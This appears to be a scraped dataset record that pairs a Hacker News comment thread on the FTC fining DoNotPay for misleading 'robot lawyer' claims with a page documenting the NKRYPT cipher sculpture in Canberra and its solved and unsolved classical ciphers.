they're making off of this. [1]: https://research.contrary.com/company/donotpay reply xoa 18 minutes agoparent>$193K seems like a pittance compared to the money they're making off of this. I don't have any special knowledge of this specific case, but it's important to note as a general principle that often the point of these fines is as the start of a process. It creates a formal legal record of actual damages and judgement, but the government doesn't see massive harm done yet nor think the business should be dead entirely. They want a modification of certain practices going forward, and the expectation is that the company will immediately comply and that's the end of it. If instead the business simply paid the fine and flagrantly blew it off and did the exact same thing without so much as a fig leaf, round 2 would see the book thrown at them. Defiance of process and lawful orders is much easier to prove and has little to no wiggle room, regardless of the complexity that began an action originally. Same as an individual investigated for a crime who ends up with a section 1001 charge or other obstruction of justice and ends up in more trouble for that than the underlying cause of investigation. So yes, not necessarily a huge fine. But if there weren't huge actual damages that seems appropriate too, so long as the behavior doesn't repeat (and everyone else in the industry is on notice now too). reply mgraczyk 1 hour agoparentprevThe main product actually works, this is for additional claims that were misleading. It isn't right to compare the settlement to the entire company revenue. Better to compare to the benefit gained by wrongdoing, or the amount of harm caused. reply ahmeneeroe-v2 2 hours agoparentprevThis is founder-raising-funds math (or VC looking for liquidity math). 200k subscribers might not mean paid subs and it certainly doesn't mean 1-year of paid subs. This could be $9M (a single-month of 250 paid subs) or lower. reply gradyfps 20 minutes agorootparentFair points. I hadn't considered that a trial subscription is still a subscriber. reply pbhjpbhj 1 hour agorootparentprevTheir point still stands though. If the output should be reviewed by a lawyer, then the penalty should be all the profits (and maybe also the wages of the CEO) to deter others from doing the same, and ensure that they don't continue in the belief that an occasional 1-2% is perfectly acceptable 'cost of doing business'. reply ahmeneeroe-v2 30 minutes agorootparentMaybe $193k is all that the FTC felt could be attributed to the \"deceptive business practices.\" It's weird to think that the FTC is right about the investigation, but somehow flubbed the penalty reply Mordisquitos 3 hours agoprevI love the quote they included in their ads, purportedly from the Los Angeles Time but \"actually from a high-schooler’s opinion piece in the Los Angeles Times’ High School Insider\": > \"what this robot lawyer can do is astonishingly similar—if not more—to what human lawyers do.\" reply gradyfps 3 hours agoparentTo be fair if legal paperwork follows a standard process with standard information, a \"robot\" can complete many orders of magnitude more than any human lawyer. (I'm also not a lawyer and have no idea if this line of thinking is applicable.) reply raverbashing 2 hours agorootparentHonestly most lawyers (that I know at least) just keep templates of most common documents and fill in the blanks as needed For basic stuff this is 95% of the end product reply vundercind 2 hours agorootparentI guarantee it’s going to be impossible to compete as a lawyer in most fields without doing most of the work with LLMs, probably within a few years. I expect the benefits of increased efficiency will be seen as temporarily zeroed inflation for legal services (prices actually going down? LOL) and a bunch of rents, forever (more or less, from the perspective of a human lifetime) to whichever one or two companies monopolize the relevant feature sets (see also: the situation with digital access to legal documents). Lawyers will be more productive but I expect comp will stay about the same. And I think that as someone fairly pessimistic about the whole AI thing. reply woah 1 hour agorootparentprevAnd 95% of a doctor's job is just saying \"your checkup looks OK Joe, just try to get some exercise and eat more fiber\". reply jonas21 30 minutes agoprevPerhaps unsurprisingly, DoNotPay did hire a very expensive law firm (Wilson Sonsini) to represent them in this case. I would have loved to see how their robot lawyer would have fared. reply whoisjuan 3 hours agoprevThis is a very sneaky ethically gray company. Their app is not only of terrible quality but also full of dark patterns. I'm convinced that any revenue they make comes from people who can't figure out how to cancel. Stay away from it. reply winddude 1 hour agoprev'''\"None of the Service’s technologies has been trained on a comprehensive and current corpus of federal and state laws, regulations, and judicial decisions or on the application of those laws to fact patterns,\" the FTC found''' Wow!! That seems so simple, and literally a few weeks to do in today's ecosystem, now thoroughly testing make take a little more time, but wow, I wonder if it was evening attempting to do RAG. reply fudged71 1 hour agoprevLawyer Kathryn Tewson on Twitter has been calling them out for a long time https://x.com/kathryntewson/status/1838995653630083086?s=46 reply Palmik 2 hours agoprevThe legal system has a great sense of self preservation. They will surely fight anything that possibly encroaches on their domain, especially things that give non lawyers the tools to defend themselves without feeding the machine. reply lolinder 2 hours agoparentSometimes the enemy of my enemy is still my enemy. Many organizations that purport to be helping the little guy are actually just exploiting them for profit. reply RustySpottedCat 1 hour agorootparentAs is the case with this exact company \" Fight Corporations Beat Bureaucracy Find Hidden Money \" this is exactly and entirely the thing a exploiting company would say it does. reply ChrisArchitect 2 hours agoprevOfficial release: https://www.ftc.gov/news-events/news/press-releases/2024/09/... reply mcheung610 2 hours agoprevDoNoPay has to pay a fine is just an irony. reply throwaway29812 53 minutes agoparentCould they...employ their own services? reply abixb 2 hours agoparentprevHaha, my thoughts precisely. The first 4 words of the title were bewildering for me for a few seconds. reply btbuildem 1 hour agoprevFunny thing is, they're probably still ahead financially vs if they actually hired lawyers to do this on the up-and-up. reply dboreham 2 hours agoprevOk well it seems my test for whether we really have AI yet (are there self-driving lawyers) remains unsatisfied. For me lawyers work is significantly easier to automate with some proto-AI than is software development or driving a car. So although recent AI progress is highly impressive, I'm not retiring until it takes over the lawyers. reply BarryMilo 47 minutes agoparentTruly one of the worst takes on AI I've seen. What is the purpose of a lawyer? It's not to read the law, the text is free (or should be). It's to advise you, based on the law but also on the immediate, historical and sociopolitical coontext, as well as on their understanding of the characters of all the humans involved. If that gets automated, we are in AGI territory. reply natch 32 minutes agorootparentYour first paragraph with very small tweaks (laws of physics etc., not law) could also apply to human attendants in elevators. The second paragraph… hard to make a call on that one. reply zulban 2 hours agoparentprevIt's not a question of how easy it is to automate it. It's about how frequent and costly the mistakes are. Lawyer AI is a high bar - plus the people watching you are human lawyers, exactly the kind of people who can make your mistakes more costly. reply shahzaibmushtaq 52 minutes agoprevI think DoNotPay and find out is the vision of this company. reply swalsh 2 hours agoprevThe problem with today's technology is it is indistinguishable from magic. Sometimes the magic is real, sometimes it's an illusion. It's nearly impossible as a regular consumer not deeply knowledgable of the current capabilities of models to know which is which. reply pnw 3 hours agoprevEven before AI, that website has been making overly optimistic claims for many years. It was never clear to me how real or effective it was. The Wikipedia article has more detail but it seems like this is the first time the government has actually called them out? Of course this didn't stop them raising $10m from credulous investors in 2021. reply RobotToaster 1 hour agoprevMaybe they can use their own AI to get out of paying it? reply flutas 3 hours agoprevHonestly not that surprised, the only surprising thing to me is how little of a slap on the wrist this feels like. It felt like a shaky premise at best as far back as I can remember. Even \"standard\" things often have many intricacies that a person might not know to say, and it may not let them know/ask them about it. As an example, think of all the questions TurboTax et. al ask about taxes. reply system2 39 minutes agoprevI am stopping myself from releasing shitty chatgpt wrappers which I see at every trade expo. I am just not doing it because I don't want to add more shit to the shitshow. reply beerandt 2 hours agoprevHas the chance to make their best marketing material yet. reply lifeisstillgood 1 hour agoprevYes, I get it they did a bad thing. But most of what they are setup to fight is people abusing the legal system so it’s not unfair to fight fire with fire surely? As an example I parked my car to drop my daughter off at a party and paid online - but mistyped the little number for the car park and ended up paying for 3 hours parking somewhere across the country. Naturally the private car park tries to charge me 20x the parking fee as a “fine” - which they can whistle for frankly. But they sent varying letters that sound but don’t actually say “court” or “legal action” (things like “solicitors action prior to court” I kept sending them the same answer they kept rejecting it Then they actually sued me in county court. Oh wow I thought I better pay. And as a court judgement is really bad on credit record (one above bankruptcy) it’s serious. But I checked the court website anyway to be extra careful. And Incoukd challenge it - actually appear before the beak and say “hey it’s not my fault”. So I filled in the form that says “yes I will challenge it, see you in court” That might my wife said don’t be fucking stupid they have won pay them So I went back the next day - and guess what - they had after 9 months withdrawn their action against me, no further need to progress, cancelled I called the court to find out WTF They had, and do every week, mass spammed the court with hundreds of parking cases, knowing that pretty much everyone would act like my wife pay a couple of hundred quid not to risk their credit record. I mean a county court judgement and you can kiss a mortgage goodbye. That is simple abuse - an overworked courts system, hundreds probably thousands of rubbish claims that are put simply to strong arm people to pay up with legal threats, and no genuine attempt to filter out cases with merit, or even only look at “repeat offenders” But is it worth the time of any parliamentarian to take this on (well frankly yes it would be great backbencher cause celeb, but what do I know. Anyhow there was a point here - there are many many legitimate companies whose ficking business model is based on legal strong arming anyone who makes a minor infraction and that’s ok, but having a scam my business model to fight the scammy business model is bad? Yes DoNotPay could have stayed on the right side of the line - but then would frankly run out of money. I guess we can only put our Hope in the hands of our elected representatives:-) reply balls187 57 minutes agoparentIn the US, parking and private parking lots are easily one of the scammiest businesses. reply yapyap 1 hour agoprevoh the irony reply K0balt 1 hour agoprevMy bet is they won’t pay. reply monkaiju 3 hours agoprevGood, AI shouldn't be anywhere near anything where accountability matters... reply manofmanysmiles 3 hours agoprevIt's amazing to me that people think they need other people to resolve disputes, or that \"law\" is some kind of magic... And yet people keep thinking so, both selling it as magic, and buying it as magic, and not once taking the time to consider what the words on the paper might mean. reply probably_wrong 2 hours agoparent> that \"law\" is some kind of magic... Law is some kind of magic, though. Consider the case where I want to cast the \"Lawyer\" protection spell. If I chant \"I am invoking my right to remain silent. I want to contact my attorney\" then the police must stop questioning me and provide me one [1]. The spell worked. If I chant \"This is how I feel, if y’all think I did it, I know that I didn’t do it so why don’t you just give me a lawyer dog ’cause this is not what’s up\" then my spell is not strong enough and the police can interrogate me as they see fit [2]. And then there's the time where a wizard had to interpret a comma [3]. [1] https://www.nedbarnett.com/do-i-have-a-right-to-an-attorney-... [2] https://uproxx.com/culture/louisiana-supreme-court-suspect-l... [3] https://www.loweringthebar.net/2017/03/the-oxford-comma-use-... reply manofmanysmiles 1 hour agorootparentThis is precisely the madness that I'm astounded by. Most people think this is sane, normal and moral. And, I imagine most people reading this think I'm either insane, ignorant or uneducated, or will attach some other adjectives to further alienate me. It's okay, I already feel like an alien. I'm not looking for an argument. I don't need to convince anyone. I was hoping for a more receptive audience. Oh well. reply kstrauser 2 hours agoparentprevIt's a risk/reward issue. By analogy, I am perfectly capable of filling out an IRS 1040 form, so why pay a CPA? Because the CPA knows what things can be classified as business expenses. They have first-hand knowledge of which items have passed audits and which the IRS dismissed as farfetched. You're paying for someone who has the insider knowledge to navigate a minefield of non-obvious questions. Or for a technical analogy, I'm capable of learning any programming language you can throw at me. However, a business who wants to hire someone is going to prefer someone with experience in that language's entire ecosystem. It's not enough to know the syntax. That's the easy part. The harder part is knowing which parts to reference at a given time, which modules experienced devs would choose to solve a specific problem, etc. Well, same here. I'm wholly capable of reading and understanding the words of a contract or a summons or a lawsuit. What I don't know is the significance of specific phrases in those things, or what I'm allowed to use as evidence on my own behalf, or which issues I might raise that a judge would dismiss as something learned in the first semester of law school. And that's why I'd pay a lawyer to address legal issues for me. reply toast0 2 hours agoparentprevIt's the same with plumbing, wiring, programing, writing, cooking, gardening, and most of the other verbs. For the most part, everyone can do these things, but it's nice to pay someome else to do it; especially in fields where experience gives expertise and hopefully wisdom. Also, it's handy to hire a licensed practicioner in fields where government requires licensure to sell services. Some people are really woried about making big mistakes that are expensive to clean when plumbing or wiring or lawyering. It's a legitimate thing to consider. reply twojacobtwo 2 hours agorootparentIt's a matter of opportunity costs as well. If you want to be able to do plumbing, wiring, framing... you likely don't also have the time to learn the potentially vast amount of knowledge required to adeptly navigate the legal system. > Some people are really woried about making big mistakes that are expensive to clean when plumbing or wiring or lawyering. Even worse, if you lawyer wrong (or wire wrong), you might not be able to clean it up - you just do your time or perhaps die. reply krick 2 hours agorootparentprevThere's a difference, though. Law and medicine are fields with very strong gatekeeping. You also need a licence for many construction engineering roles, and in fact both stakes and accountability there are much higher than in the former two (in fact, it is a bit appalling, how little lawyers and doctors are hold accountable for stupid shit they do, if they follow the playbook), and realistically you need to learn as much if not more to be a good construction engineer (but most construction engineers are not especially good, just as most lawyers and doctors aren't very good), but you don't see so much reverence towards construction engineers, and there are much fewer artificial borders for one to learn construction engineering. reply toomuchtodo 2 hours agoparentprevhttps://en.wikipedia.org/wiki/False_consensus_effect reply ahmeneeroe-v2 2 hours agoparentprevYou can get very far in life by just reading the contract, even farther by googling some context, and even farther by hiring an expert in the field. reply nerdjon 3 hours agoprevI am honestly surprised the fine is not more. We need to see more of these come out as AI is shoved dangerously into places thanks to the ability to use it with little to no technical knowledge. Especially when you are really just shoving data into an LLM and expecting a response to do some job, you are not training it to do a specific task. Like the home buying AI that was on HN yesterday. reply whiplash451 3 hours agoparentLink to related thread: https://news.ycombinator.com/item?id=41638199 reply SpicyLemonZest 3 hours agoparentprevThe fine was about false advertising, not dangerousness. Three of the commissioners signed on to concurring statements emphasizing that they are not opposed in principle to the use of AI in law. (https://www.ftc.gov/legal-library/browse/cases-proceedings/p...) (https://www.ftc.gov/legal-library/browse/cases-proceedings/p...) reply gosub100 2 hours agoparentprevIf a tenant is able to file a case that costs his corporate, PE owned landlord $25k to litigate, that's a win in my book. That's the same landlord who increased the rent 20% per year for the last 5 years because \"the Market\", well, Blackstone, welcome to the \"market\" where each eviction now costs you a collateral amount for ruining a hard working persons life. Imagine that, if there were a consequence to greed? reply nashashmi 2 hours agoprev [–] FTC overreached here: the AI was not tested to see if it is like a lawyer’s level of work. Why would anyone have to do this kind of study? Back in the day, anyone who touted AI generated works by default exclaimed that the work was not as good as a human. That changed now but was a valid statement back then. reply dogleash 2 hours agoparent>AI was not tested to see if it is like a lawyer’s level of work. Why would anyone have to do this kind of study? The service it purported to offer is licensed. We could sit around and talk shit about the threshold to be licensed, the bar association, or licensing in general. But that's all distraction. The point is the legal system has implemented a quality standard for providing certain services. There is a new thing providing the same service in novel way. Why wouldn't the legal system expect proof of quality? reply snakeyjake 2 hours agoparentprevI have not seen any evidence that AI output can reach quality levels of a human. Any non-trivial code generated by it takes more time to debug than just writing it from scratch. Its \"art\" is abominably bad and repetitive. Text generated by AI reads like corporate ad copy written by several committees of committees. \"Lovecraftian nightmare\" best describes its video output. AI voice generation sounds like soulless ripoffs of famous voice actors (the Attenborough clone is the worst) with misplaced stresses and an off-putting cadence derived from being completely unable to understand the broader context of the work it is narrating. Its explanations on things are inferior to the first paragraph of any wikipedia article on the query topic. A child with a pirated copy of FL-Studio can make more interesting music. The wall being erected by AI customer service agents between a problem and an actual human who might be able to solve it is frustrating and useless. On top of all of that the answers it confidently gives (almost always with no sources) are often extremely wrong. Is there a secret AI product everyone is using that is actually good? Edit: AI is however extremely good at rapidly creating an endless stream of barely-passable content designed to distract very cheaply so I expect its use by marketing and social media firms to continue its meteoric rise. reply faangguyindia 2 hours agorootparent> it's not about trivial vs not trivial. It's about how common the code is which you are asking the AI to generate and how much contextual clues it has to get the generation right. reply lupusreal 56 minutes agorootparentprevThe Dagoth Ur voice generation is shockingly good. I found a youtube channel of Dagoth Ur narrating Lovecraft stories; it's as good as human narration IMHO. reply summermusic 2 hours agoparentprevYeah why would any company have to test the efficacy of their product before making claims about its efficacy? Snark aside, this is literally a quote from their marketing: \"what this robot lawyer can do is astonishingly similar—if not more—to what human lawyers do.\" So to claim that they “exclaimed that the work was not as good as a human” is inaccurate. reply lupusreal 2 hours agoparentprev [–] > Why would anyone have to do this kind of study? Because the company chose to publish ads with misleading claims about the efficacy of their system. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The FTC fined DoNotPay $193,000 for misleadingly advertising its AI as a \"robot lawyer\" capable of suing anyone with a click.",
      "DoNotPay did not test its chatbot or employ lawyers to verify its claims, leading to the fine and a settlement without admitting liability.",
      "This action is part of the FTC's broader initiative to address deceptive AI claims, highlighting the importance of transparency and verification in AI applications."
    ],
    "commentSummary": [
      "DoNotPay has been fined $193K by the FTC for falsely advertising an untested AI lawyer, without attorney verification of AI outputs or legal claims.",
      "Despite past positive reception, DoNotPay faces criticism for false advertising and other questionable practices, raising ethical concerns.",
      "The fine is minor compared to DoNotPay's estimated $54 million annual revenue, highlighting the ongoing appeal of affordable legal services amidst a complex and costly legal system."
    ],
    "points": 169,
    "commentCount": 130,
    "retryCount": 0,
    "time": 1727363624
  },
  {
    "id": 41658766,
    "title": "NKRYPT Sculpture",
    "originLink": "https://www.meme.net.au/nkrypt/",
    "originBody": "NKRYPT sculpture NKRYPT is a cryptography related installation outside the Questacon science exploration centre in Canberra, Australia. It was designed by Stuart Kohlhagen, and installed in March 2013 during the Centenary of Canberra These pages document progress towards deciphering this work. There are many parts which have yet to be publicly solved. Other NKRYPT related pages include dkrypt.org with extensive photographs, entries on Klaus Schmeh's blog and the facebook page. plaque overview geospatial and caesar semaphore and scytale binary and rotor pigpen and cogs braille and railfence dna and astroids squircles and waveform labyrinth and title and pvl base code tweet spoilers plaque A plaque on the wall of the forecourt near pillar H introduces the installation. NKRYPT Mystery beyond Decipher the veiled meaning Renown awaits you From simple to hard, the key to the last is found in all the rest. One code within NKRYPT celebrates Canberra's Centenary. Be first to decipher it and win a great prize. For more information: www.questacon.edu.au Proudly supported by Mr Eddie Kutner and Mr Leon Kemplar overview NKRYPT consists of eight stainless steel pillars. Each pillar has several stenciled ciphertexts which have been lasercut out of the steel. They are lit both externally and internally. The pillars each have a cipher at about head height, and these can all be represented as a cylinder of 26x5 symbols, which I call the 'ring' ciphers. The lower half of each of the pillars also have a cipher, varying widely in form. Across the bases of the pillars is another cipher. And the tallest pillar has a cipher in the section above the ring cipher. I have arranged the pillars in order of fiducial spacing, which I have labelled A to H. On other websites you will find a numbering scheme; the correspondence is A=7, B=4, C=6, D=2, E=8, F=3, G=5, H=1. Pillar heights are A=1709mm, B=1887mm, C=2153mm, D=2347mm, E=2393mm, F=2379mm, G=2432mm, H=2569mm. Above each ring cipher is a pair of triangular fiducials, one immediately above and a second at the top of the piller. They face A=south, B=north, C=north, D=south, E=east, F=west, G=east, H=west. The triangular fiducials are in pairs on the pillars, with separations of A=0mm, B=116mm, C=354mm, D=571mm, E=628mm, F=636mm, G=655mm, H=786mm. All of the ring ciphers are traversed in labyrinthine fashion. Between each pair of rows, there is only one traversal down and up, and we think that these traversal positions represent settings for the rotor machine on pole C (A=DNOI, B=CFEC, C=FHIG, D=HWCJ, E=EFCF, F=CMBH, G=????, H=SMOU). The end of the ring ciphers is the symbol below the fiducial (pillars A, B, D, H), or 180 degrees from that position (pillars C, E, F). They start and end on the top row (pillars A, B, C, E, F, H), or the bottom row (pillar D). The pillars are placed on the west side of Questacon, and form a constellation as shown in this scale diagram. A: geospatial 35248614916353547101490974 24725391509414892533731941 14909573522681490367353636 41635353213194116435346709 81491040353180149092635377 A sequence of numbers which are latitude and longitude coordinates for locations around Canberra. The first three suburbs are Questacon locations, and the remaining suburbs are connected to Australian scientists and innovators. This was the solution to the Centenary Code challenge. 35248614916353547101490974 24725391509414892533731941 14909573522681490367353636 41635353213194116435346709 81491040353180149092635377 35.2742S, 149.1373E Ainslie, former location of Questacon 35.2984S, 149.1312E Parkes, Questacon National Science and Technology Centre 35.3180S, 149.0926E Deakin, Questacon Technology Learning Centre 35.3778S, 149.1040E Farrer [wheat breeding pioneer] 35.3536S, 149.0764E Chifley [streets named after scientists] 35.3461S, 149.0367E Rivett [chemist] 35.3636S, 149.0957E Mawson [Antarctic explorer] 35.2268S, 149.0519E Florey [pharmacologist and pathologist] 35.2486S, 149.1635E Hackett [streets named after scientists] 35.4710S, 149.0974E Banks [botanist] [plaintext posted by Glenn McIntosh] A: caesar A LETTER SHIFT A CIPHER MAKES A FAMOUS ROMANS NAME IT TAKES B MFUUFS TIJGU B DJQIFS NBLFT B GBNPVT SPNBOT OBNF JU UBLFT C UJKHV QH VYQ AQW PQY ECP DTGCM DWV QVJGT OQXGU C EQFG ECP OCMG KRZHYHU WKHB EH VZDSSHG DERXW D NXID PDQ FRXOG ILQG WKHP RXW RPKR QMWJZZKRG WYMABY INGY PZBZIE XROZA OPK RNQV SA ENMPL XVZIZ GBHV ERIQIF These are various kinds of shift ciphers, Caesar cipher, shift cipher, Al-Kindi cipher, and Vigenere cipher. The last Vigenere cipher uses the keyword \"VIGENERE\". A letter shift a cipher makes a famous Roman's name it takes [Caesar] A shift of two you now can break but other moves a code can make [shift] However they be swapped about a Kufa man could find them out [Al-Kindi] When different shifts each letter takes The name of which great code awakes [Vignere] [plaintext posted by Gregory Lloyd] B: semaphore 65 45 32 33 42 46 64 64 21 66 46 32 34 64 51 42 31 12 66 33 43 65 33 66 11 51 64 12 64 64 33 42 33 66 32 55 66 41 46 45 33 13 12 64 56 45 34 13 26 66 36 26 45 51 64 64 36 51 66 46 64 51 51 66 41 64 32 34 66 42 31 13 45 33 66 34 34 26 12 64 45 31 26 51 11 66 33 12 12 31 66 51 11 42 33 12 31 42 64 46 42 26 55 11 45 24 56 12 64 46 66 31 12 51 66 51 26 33 45 31 41 64 33 43 64 55 42 46 32 33 This is a Chappe semaphore system, transcribed with a number representing the angle from the centre of the glyph (45, 90, 135, 225, 270, 315). COPRIMEEXAMPLESINDARKCRABS EDEERIRAPYAGMORFDEWOLFTAHT OSEEHSAMESSAGEPLAINFORALLT DEONTSBARDDNASBIRDNIEMITYB OVWDEMANDSASTRONGERKEYIMPR code that flowed from gay Paris a message plain for all to see now demands a stronger key improved by time in dribs and drabs three prime examples in dark crabs [plaintext posted by Bob Dovenberg] B: scytale AGPSHALHALIECNREWTOCTPUWS MEOLOLOADOEEEOSAAHVHEERIP EHNAWLSVMFNCRFICCAESRDENA SIHVNBEEIATETAAEOTDMHEHFR SDIETYRARNGUAPNSDPMAENIOT AUSSOCSNACRNIEPAERURLSSRA This is a scytale wrapped around a hexagonal baton. The plaintext refers to a message of revolt marked on the head of a slave by Histiaeus, and a scytale scroll sent to Lysander of Sparta in 404BC. A message hid upon his slave shown to all by closer shave an admiral of ancient Greece uncertain of a Persian peace saw a code that proved much smarter helped ensure his win for Sparta [plaintext posted by 'skintigh'] C: binary -...-.....-.-...--..--.--..-.--..-..-..-.--.-..----. --...------...-...-.-----.......----.-......-.--.... ..-...........-.-.-.........-.......-...-...-....... ----------..---.-...-..--..-.--.-...-..--.---.-...-. .-----..--.--..-..-.......-......--.....-.-----.-.-. ............-.-.......-.....-...-.....-.-........... -...---..--..----..-----..-..----.--.-..-.--..-..--. .----.-...-...-..----...-.-...-.-.-----.-...--..-... ....-.......-.........-.-.-.-.........-...-.....-... --.-.--.....-.-..--.-.-.-.------.--.....-...----...- ---...-..--.-.....-.-----.--..-.--.-----.-.-....-... ....-.....-.-...-...........-.................-...-. --.----..--.----..-..-.--...-..-...--.-..-----.--.-. --....-...-......--.--...-.--...-..---......----.--- ..-.-...-.-.-.-.......-.-.....-.-.-.....-........... This is a binary code with dashes for 1 and dots for 0. Each character is a 2x3 array, with the bits low order first. The plaintext is a list of scientists and inventors, who worked on electrical telegraphy and wireless telegraphy. MPILLEATSTONEBRANLYBRAUNCA KOOCOHWYADARAFRAYDARUOMEDE ILWEBERGINGSTURGEONTESLAVA OFREHTUAREMMEOSGNILLIHCSDR ORSERUSSHENRYHERTZMARCONIM Branly, Braun, Campillo, Cooke, DeMoura, Dyar, Faraday, Gauss, Henry, Hertz, Marconi, Morse, Rutherford, Schilling, Soemmering, Sturgeon, Tesla, Vail, Weber, Wheatstone [plaintext posted by Glenn McIntosh] C: rotor Rotor 1 wiring ABCDEFGHIJKLMNOPQRSTUVWXYZ UDBCFGEJHILMKTSNOPQRWXYZAV Rotor 2 wiring ABCDEFGHIJKLMNOPQRSTUVWXYZ BZCXWHIFGLMJKVUPSQRTONEDYA Rotor 3 wiring ABCDEFGHIJKLMNOPQRSTUVWXYZ ZADEFGCHMIJKLOPQRNWSTUVBXY Rotor 4 wiring ABCDEFGHIJKLMNOPQRSTUVWXYZ BDFCEGIJKLSMAZNHOPQRTVXUWY Reflector wiring ABCDEFGHIJKLMNOPQRSTUVWXYZ ZYVMLIHGFKJEDURQPOTSNCXWBA BIOB AXQC NLPA MNXE SBNT FJLD DL JAWS FDHD MATX EJHM PVUJ XJOM KH These are movable rotor wheels with wiring lines between letters (analogous to an Enigma machine). The reflector wheel is fixed. Each have triangular fiducials for alignment of the start position. The advancement is done manually, with a sequence chosen by the user. It is possible that the lower ciphertext is some sort of transposition key. Here is a C++ implementation of the encryption. [unsolved] D: pigpen LUCKVERURCHSIEGINGALLMEING IENEROLDRIMTELHEFRETHCSOBN HTUSERKORENDENNMEINETOEWIC NEAHCINIBESHCONRHITIMHOLFT ZUMLEIDENHICHSIEZITTERN123 This is a pigpen cipher, with right-to-left lines upside down, and in German. The plaintext is the second quatrain from the first aria performed by the Queen of the Night in Mozart's \"Die Zauberflöte\". The pigpen cipher was commonly used by the Freemasons, and the opera contains rationalist Freemason motifs. LUCKVERURCHSIEGINGALLMEING IENEROLDRIMTELHEFRETHCSOBN HTUSERKORENDENNMEINETOEWIC NEAHCINIBESHCONRHITIMHOLFT ZUMLEIDENHICHSIEZITTERN123 Zum Leiden bin ich auserkoren Denn meine Tochter fehlet mir; Durch sie ging all mein Gluck verloren Ein Bosewicht entfloh mit ihr Noch seh ich sie zittern. 1 2 3 I am chosen for suffering, for my daughter is gone from me; Through her all my happiness has been lost, a villain fled with her I can still see her trembling 1 2 3 [plaintext posted by Bob Dovenberg] Conjecture, the '123' filler at the end of the plaintext might refer to: the three remaining lines of the third quatrain (Erschüttern, Beben, Streben); the three flats of the key; the three chords beginning the overture (E-flat minor, C-minor, E-flat major); the three masonic pillars (wisdom, strength, beauty); or the three veiled ladies who attend the queen of the night. D: cogs [cogs] [unsolved] E: braille ** *· ** *· *· ** *· ** *· ** *· ·* *· *· ·* *· *· *· ·* ·* ·* ** *· ·* *· ** ** ·* ·* ·* ·· ·* ·* *· ·· ·* ·· *· *· ·· *· ** ·* ** ** *· *· ** ** ** ·* ·* ·· ·· *· ·· ·· ·· *· ·· ·· *· ·· ·· *· ·· *· ·· *· *· *· *· ·· ·· ·· *· ·· ·· *· ·* ·· ·* ·· ·* ·· ·· ·* ·* ·* ·· ·* ·* ·· ·* ·* ·* ·* ·· ·* ** ·· ·· ·* ·· ** ·* ·· ** *· ** ·* *· ·* *· *· ·· ·· ** ·· ·* *· ** ·* *· ·* ·· ·* ** ** ·* *· ·* ·* ·* ·* ·* ** ** ·* ·* ** ·* ·* ·* ·* ** ·* *· *· ·* *· ·* ·* ·* *· *· *· ·* *· *· *· *· ** ** *· *· *· *· *· *· *· ·* ·* ·* ·* ·* ** ** ** *· ·* ·* ·* *· ** ·* ** ·* ·* ·· ** *· ·· ** *· ·* ** *· *· ** ** *· ·* ** ** ·· *· ** ·· ·· ·· ·· ·· ·· *· ·· ·· ·· ·· *· ·· ·· *· *· ·· *· *· ·· *· ·· *· ** ·· *· ·* ·* ·* ·* ·* ·· ·* ·· ·* ·· ·· ·* ·· ·· ·· ·· ·* ·* ·· ·* ·* ·* ·· ·· ·· ·· ** *· ** *· *· ·* ** ** ** *· ** *· ·· ·* ·· ·* *· ·* ·* ** ·· ** ·· *· *· ** *· ** *· ** ·* *· ** ** ·* ·* ** ** ** ** ·* ** ·* ** *· *· ·* ·* ·* ** ·* ·* ·* *· *· *· ·* ** ·· *· ** *· ·* ** *· ·* *· *· *· *· *· *· *· ** *· *· *· ·* ** ·* ** ·· *· ·* ** ·* *· ·· *· ·* ·· *· *· ·· *· *· ·* ·· ** ** ** ·* ·· ** ·* *· *· *· *· ·· *· *· ·· ·· *· ·· ·· ·· *· ·· *· *· *· ** *· ·· *· ·· ·· *· This is a Braille cipher. Lines traversed right-to-left are upside down. GENEADOFANAILASHORTSIGHTED WLARERFDLONAKRAPOTSESUBHTI EIHEHENCHBARBERSITTINGQUIT TNTNOILGREGNIFAFOPITKRADEH WORKSDEOFASNAILALLOURGREAT A short-sighted general with buses to park [Napoleon?] an old French Barber sitting quite in the dark [Barbier] Tip of a finger, glide of a snail [Braille] all our great works on the head of a nail. [plaintext posted by Bob Dovenberg] E: railfence The lower cipher is a rail fence cipher. A simple code to hide your tails it's letters nailed to different rails [rail fence cipher] A famous scholar from times past with copper discs encoded fast [Alberti] A German monk with codes so strong used keys to shift the cipher on [Trithemius] A family down the mountainside a cabinet noir they worked inside [Rossignol] [plaintext posted by Matthew Bienik] F: dna AGGTAGTTGCTC*AAGCGTGCTAGCT TCCATCAACGAG TTCGCACGATCGA GGGTACGGTCCACCAGGAGGCATACT CCCATGCCAGGTGGTCCTCCGTATGA CCCTGTGCGTAAACCGTCTGATGACC GGGACACGCATTTGGCAGACTACTGG AAGGCACACGGCCGCTCATACGGTAG TTCCGTGTGCCGGCGAGTATGCCATC GTTAGTTACCTTGCGTGCTCTCGGCC CAATCAATGGAACGCACGAGAGCCGG These group in 3-letter codons for proteinogenic amino acids. The amino acids each have a 1 letter code. TCCATCAACGAG*TTCGCACGATCGA GGGTACGGTCCACCAGGAGGCATACT GGGACACGCATTTGGCAGACTACTGG AAGGCACACGGCCGCTCATACGGTAG CAATCAATGGAACGCACGAGAGCCGG TTC GCA CGA TCG ATC GGT CAT ACG GAG GAC CTG GCA GAC TAC TGG GAG ATG GCA TAC TCG CCG GCA TGG AAC GCA CGA GAG CCG GCA ATC AAC ACG GAG GAC ACG CAT TAC CTG GCA TGC ATC AAC GAG F A R S I G H T E D L A D Y W E M A Y S P A W N A R E P A I N T E D T H Y L A C I N E far sighted lady we may spawn a repainted thylacine [plaintext posted by Bob Dovenberg] Conjecture, the plaintext may refer to the Australian conservation geneticist Karen Firestone, who worked on the Australian Museum project to recover thylacine DNA. F: astroids The astroids are in 42 columns spaced around 22mm apart and with irregular vertical spacing. Each astroid is around 15mm across. They are the shape of the Unicode black four-pointed star (U+2726). [unsolved] Conjecture, they may represent light spectra (eg from stars or elements). G: squircles 01110011011101021231331012 02030013322303333000200032 21221133103032320102000132 23123002121223001301131123 10103100010101201201221103 30212131033000203011112330 30101111212032132012210133 13303323023120222333322012 00000101022001203231310031 30110333202120112302112123 [unsolved] These 'squircles', have an appearance like petals or cams. Conjecture, is that they are grouped in vertical pairs to give the standard 26x5 labyrinth grid. G: waveform UWGHTLIYCOEYDY RFKVOACMHPUCEAL BANYUJHEESHABPS NAYIDQGILTIVKTE FAESOKTMZQDMRGH HYLHNICNLBNWWXX KGAPYHIIQHSKETZ RRENUCMTVUINLZR ICYRFFGTKDNBQSH NLXZWKMVCICTCDD ZAOWRSUNVMDOIXG 